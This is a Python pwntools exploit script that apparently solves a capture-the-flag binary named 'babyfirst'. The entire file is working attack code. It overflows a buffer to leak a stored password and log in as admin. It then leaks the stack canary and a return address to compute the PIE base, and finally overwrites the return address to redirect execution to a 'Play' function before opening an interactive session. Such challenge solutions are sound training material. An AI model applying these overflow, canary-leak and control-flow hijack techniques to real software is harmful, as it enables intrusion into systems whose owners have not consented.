from pwn import *
import time

p=process('./babyfirst')
elf=ELF('babyfirst')
##ROP find
rop = ROP('babyfirst')
try:
	pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
except:
	print("no ROP for you!")
	sys.exit(1)

def tag(a,b):
	log.info('Address {}: {}'.format(a,hex(b)))
# pause()
p.sendline('1')
time.sleep(0.5)
payload= 'b'* (0x20-3)+'pas' 
p.send(payload)     #send w0 /n 0x20 to concat password to username
time.sleep(0.5)      
p.sendline('2')
time.sleep(0.5)
p.recvuntil('pas')
pas=p.recv(16)       #recv 16 byte passsword
p.sendline('1')
time.sleep(0.5)
p.sendline('admin\0')  
time.sleep(0.5)
p.sendline(pas)
time.sleep(0.5)
p.sendline('2')
time.sleep(0.5)
p.send('a'*(0x28-3)+'can'+'#')
time.sleep(0.5)
p.recvuntil('can')
canary=p.recv(8)
canary=bytearray(canary)
canary[0]=b'\x00'
canary=u64(canary)
# log.info('canary:'+hex(u64(canary)))
tag('canary',canary)
time.sleep(0.5)
# p.sendline(canary)
# print hex(pop_rdi)
# print hex(elf.sym['main'])
# pay1='END'+(0x28-3)*'a'+canary+'#'*10
pay='a'*(0x38-8)+'\x00'
p.send(pay)
time.sleep(0.5)
ret=p.recv(8)
ret=u64(ret.ljust(8,'\x00'))
# log.info('ret:'+hex(ret))
tag('ret',ret)
text_base=ret-0xfb1
tag('text_base',text_base)
Play=text_base+elf.sym['Play']
tag('Play',Play)
# time.sleep(0.5)
# p.recvuntil('ret')
# ret=p.recv(8)
# log.info('ret: '+ret)
p.sendline('END'+cyclic(0x28-3)+p64(canary)+'a'*8+p64(Play))
# p.sendline('END')
# p.send(canary)
# p.send(cyclic(0x28)+canary+'a'*200)
# p.sendline('2')
# p.sendline(cyclic(0x28)+"\x00"+canary+cyclic(200))

p.interactive()